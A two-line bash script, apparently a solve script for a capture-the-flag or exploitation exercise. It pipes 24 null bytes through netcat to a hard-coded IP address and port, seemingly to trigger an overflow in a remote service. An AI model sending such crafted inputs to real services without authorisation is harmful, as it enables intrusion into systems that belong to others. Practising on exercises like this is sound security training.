#!/bin/bash

python2 -c "print('\x00'*24)" | nc 54.89.22.85 10002
